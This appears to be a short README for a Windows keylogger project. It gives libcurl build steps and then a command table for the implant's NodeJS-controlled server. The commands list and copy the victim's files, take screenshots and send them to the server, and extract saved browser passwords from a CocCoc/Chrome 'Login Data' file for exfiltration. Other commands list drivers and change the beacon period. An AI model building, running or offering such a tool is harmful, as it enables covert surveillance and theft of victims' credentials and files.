# KeyLogger

# Build Libcurl (static lib)
Read file curl-7.45.0\winbuild\BUILD.WINDOWS.txt for more information

1. Open VS2015 x86 Native Tools Command Prompt
2. cd path\curl-7.45.0\winbuild
3. nmake /f Makefile.vc mode=static DEBUG=yes MACHINE=x86
   nmake /f Makefile.vc mode=static DEBUG=no MACHINE=x86
4. Copy build/release/lib/libcurl_a.lib --> \curl\libcurl\lib (VS project)
   Copy build/release/include/curl --> \libcurl\include (VS project)


# NodeJS command
1. ls C:\folder\\[1]\[5]		    :   List all file/folder
2. cp C:\folder\\[1]\file.txt        :   Copy file
3. screenshot               	    :	   Capture screenshot and sent to server
4. decrypt                  	    :	Decrypt chrome login data C:\Users\Admin\AppData\Local\CocCoc\Browser\User Data\Default\Login Data

      4.1 Download Login Data file
      4.2 Export password using "DB Browser for SQL Lite" to file
      4.3 Send file
5. drivers                  	    :	Print al driver
6. update_period 8000               :	Change update period (ms)